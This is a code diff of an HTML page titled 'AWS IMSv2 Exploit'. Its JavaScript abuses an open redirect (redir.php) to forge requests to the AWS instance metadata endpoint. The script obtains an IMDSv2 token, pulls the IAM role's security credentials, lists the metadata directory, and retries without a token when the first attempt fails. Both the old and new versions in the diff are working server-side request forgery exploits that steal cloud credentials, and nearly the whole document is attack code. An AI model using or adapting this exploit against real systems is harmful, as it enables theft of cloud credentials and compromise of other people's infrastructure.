@@ -1,38 +1,90 @@
 <html>
-    <h1>Hacking Toolz SSRF Exploit</h1>
+    <h1>AWS IMSv2 Exploit</h1>
+    <div id="status">Starting exploit...</div>
     <div id="tokenResponse"></div>
     <div id="metadataResponse"></div>
     <div id="credentialsResponse"></div>
     <div id="error"></div>
+    
     <script>
-        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
-        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
-        var credentialsURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
-        var xhr = new XMLHttpRequest();
-        var token = '';
+        document.getElementById("status").innerHTML = "JavaScript loaded, attempting AWS IMSv2 exploit...";
         
-        try {
-            // Step 1: Get AWS IMSv2 token
-            xhr.open('PUT', tokenUrl, false);
-            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
-            xhr.send();
-            token = xhr.responseText;
-            document.getElementById("tokenResponse").innerHTML = "<h3>Token Response:</h3><pre>" + token + "</pre>";
-
-            // Step 2: Get metadata directory listing
-            xhr.open('GET', metadataURL, false);
-            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
-            xhr.send();
-            document.getElementById("metadataResponse").innerHTML = "<h3>Metadata Response:</h3><pre>" + xhr.responseText + "</pre>";
+        function makeRequest(method, url, headers, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open(method, url, true); // Use async requests
             
-            // Step 3: Get S3 credentials directly
-            xhr.open('GET', credentialsURL, false);
-            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
-            xhr.send();
-            document.getElementById("credentialsResponse").innerHTML = "<h3>S3 Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + xhr.responseText + "</pre>";
+            // Set headers
+            if (headers) {
+                for (var header in headers) {
+                    xhr.setRequestHeader(header, headers[header]);
+                }
+            }
             
-        } catch(err) {
-            document.getElementById('error').innerHTML = "<h3>Error:</h3><pre>" + err.message + "</pre>";
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    callback(xhr);
+                }
+            };
+            
+            try {
+                xhr.send();
+            } catch(e) {
+                document.getElementById("error").innerHTML += "<p>Error in " + method + " request: " + e.message + "</p>";
+            }
         }
+        
+        // Step 1: Get AWS token
+        document.getElementById("status").innerHTML += "<br>Step 1: Requesting AWS token...";
+        
+        makeRequest('PUT', '/redir.php?url=http://169.254.169.254/latest/api/token', 
+            {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, 
+            function(xhr) {
+                if (xhr.status === 200 || xhr.status === 0) {
+                    var token = xhr.responseText;
+                    document.getElementById("tokenResponse").innerHTML = "<h3>Token:</h3><pre>" + token + "</pre>";
+                    document.getElementById("status").innerHTML += "<br>Step 2: Token received, getting metadata...";
+                    
+                    // Step 2: Get credentials with token
+                    makeRequest('GET', '/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
+                        {'X-aws-ec2-metadata-token': token},
+                        function(xhr2) {
+                            if (xhr2.status === 200 || xhr2.status === 0) {
+                                document.getElementById("credentialsResponse").innerHTML = "<h3>AWS Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + xhr2.responseText + "</pre>";
+                                document.getElementById("status").innerHTML += "<br>SUCCESS: Got AWS credentials!";
+                            } else {
+                                document.getElementById("error").innerHTML += "<p>Credentials request failed: " + xhr2.status + " - " + xhr2.responseText + "</p>";
+                            }
+                        });
+                        
+                    // Also try to get general metadata
+                    makeRequest('GET', '/redir.php?url=http://169.254.169.254/latest/meta-data/',
+                        {'X-aws-ec2-metadata-token': token},
+                        function(xhr3) {
+                            if (xhr3.status === 200 || xhr3.status === 0) {
+                                document.getElementById("metadataResponse").innerHTML = "<h3>Metadata Directory:</h3><pre>" + xhr3.responseText + "</pre>";
+                            }
+                        });
+                        
+                } else {
+                    document.getElementById("error").innerHTML += "<p>Token request failed: " + xhr.status + " - " + xhr.responseText + "</p>";
+                    
+                    // Try alternative approaches
+                    document.getElementById("status").innerHTML += "<br>Trying alternative approaches...";
+                    
+                    // Try without localhost prefix
+                    makeRequest('GET', '/redir.php?url=http://169.254.169.254/latest/meta-data/', {}, function(xhr4) {
+                        if (xhr4.status === 200 || xhr4.status === 0) {
+                            document.getElementById("metadataResponse").innerHTML = "<h3>Direct Metadata (no token):</h3><pre>" + xhr4.responseText + "</pre>";
+                        } else {
+                            document.getElementById("error").innerHTML += "<p>Direct metadata failed: " + xhr4.status + "</p>";
+                        }
+                    });
+                }
+            });
+            
+        // Timeout fallback
+        setTimeout(function() {
+            document.getElementById("status").innerHTML += "<br>Request completed.";
+        }, 5000);
     </script>
 </html>
